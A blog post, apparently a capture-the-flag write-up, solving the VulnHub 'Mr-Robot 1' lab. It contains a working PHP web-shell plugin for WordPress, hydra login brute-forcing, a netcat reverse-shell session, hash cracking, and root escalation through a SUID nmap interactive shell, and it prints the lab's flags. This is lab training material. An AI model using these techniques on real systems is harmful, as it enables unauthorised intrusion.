---
layout: post
title: Mr-Robot 1
date: 2019-09-15
author: the-bilal-rizwan
comments: true
categories: vulnhub
tags: [ctf,vulnhub]
---

## Mr-Robot 1

> The vulnhub page says we need to find 3 keys so lets get started

Started off with nmap and found 2 open ports

On port 80 I saw the following page I did go through all the options / commands listed but it wasn't anything just videos and pictures.

![main page]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/mrrobot/index.png)



I ran dirsearch and found robots.txt in which I manage to find key 1

`key 1 or 3`

![key1]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/mrrobot/flag1.png)


The other file `fsociety.dic` was actually a word list which I saved it for later use.


Looking at the dirsearcher results found out that the webserver was actually running wordpress. 
I used wpscan didn't find anything usefull and was stuck for a while. 

Then I thought to use the wordlist to try to bruteforce the login. Since I have watched Mr robot the first username that came in my mind was `Mr.robot` I used that as a username but didn't find anything then I use "Elliot" as a username and bruteforced the login with hydra and voila!

Elliot and the password ER28-0652!

Logged in to the dashboard of wordpress


![Dashboard]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/mrrobot/dashboard.png)




from here we can uplaod a simple plugin to get a shell


zip the following php code 

```php
<?php
/*
Plugin Name: Shell
Plugin URI: https://themctfwriteups.com/shells
Description: This hacks you 
Author: the-bilal-rizwan
Version: 1.0.0
Author URI: https://thectfwriteups.com/
*/

echo shell_exec($_GET['cmd']);
```

upload it and you get a shell using the following link 


http://TARGET_IP/wp-content/plugins/shell.php_/shell.php?e=id


![Shell]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/mrrobot/shell.png)



Then I got a reverse shell

```bash
nc -lvp 1337
listening on [any] 1337 ...
192.168.114.136: inverse host lookup failed: Unknown host
connect to [192.168.114.128] from (UNKNOWN) [192.168.114.136] 58895
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
<ps/wordpress/htdocs/wp-content/plugins/shell.php_$ cd /home
cd /home
daemon@linux:/home$ ls
ls
robot
daemon@linux:/home$ cd robot
cd robot
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt  password.raw-md5
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$ 



I cracked the password and this is what I got 

user: robot
pass: abcdefghijklmnopqrstuvwxyz


robot@linux:~$ ls  
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@linux:~$ 
```

`key 2 of 3`
822c73956184f694993bede3eb39f959 



now moving on to root


Running LinEnum.sh I found the following SUID binaries


![linEnum]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/mrrobot/enum.png)

LinEnum flagged out that nmap also has SUID bit set 

```bash
robot@linux:/tmp$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-or-3.txt
cat key-3-or-3.txt
cat: key-3-or-3.txt: No such file or directory
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
# 
```

`key 3 or 3`
04787ddef27c3dee1ee161b21670b4e4



